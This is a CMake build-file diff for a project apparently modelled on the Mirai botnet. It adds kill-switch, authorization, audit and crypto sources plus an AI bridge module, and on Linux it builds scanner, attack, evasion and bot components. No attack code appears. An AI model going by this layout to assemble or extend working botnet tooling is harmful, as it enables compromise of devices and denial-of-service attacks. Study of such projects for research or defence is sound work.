@@ -50,25 +50,45 @@ add_library(mirai_common STATIC
     src/common/logger.c
     src/common/util.c
     src/common/crypto.c
+    src/common/kill_switch.c
+    src/common/audit_log.c
+    src/common/metrics.c
+    src/common/random_secure.c
+    src/common/socket_opts.c
+    src/common/authorization.c
+    src/common/pq_crypto.c
 )
 
 target_link_libraries(mirai_common
     ${JSON_C_LIBRARIES}
     ${SODIUM_LIBRARIES}
+    curl
 )
 
 # Modern modules
-add_subdirectory(src/scanner)
-add_subdirectory(src/attack)
+# attack, scanner, evasion use Linux-specific APIs (epoll, iphdr, PTRACE_TRACEME).
+# On Linux (including Docker/CI) build everything. On macOS build only what compiles cleanly.
+add_subdirectory(src/ai_bridge)
 
-# Bot component
-if(BUILD_BOT)
-    add_subdirectory(src/bot)
+if(CMAKE_SYSTEM_NAME STREQUAL "Linux")
+    add_subdirectory(src/scanner)
+    add_subdirectory(src/attack)
+    add_subdirectory(src/evasion)
+
+    # Bot component (depends on scanner + attack)
+    if(BUILD_BOT)
+        add_subdirectory(src/bot)
+    endif()
+else()
+    message(STATUS "Non-Linux host detected (${CMAKE_SYSTEM_NAME}) — "
+                   "skipping scanner/attack/evasion/bot (Linux-only modules). "
+                   "Use Docker for full builds.")
 endif()
 
-# Loader component
+# Loader component (lives in loader/ at project root, not src/loader)
 if(BUILD_LOADER)
-    add_subdirectory(src/loader)
+    # loader/ uses its own Makefile — skip CMake integration for now
+    # add_subdirectory(loader)
 endif()
 
 # Tests
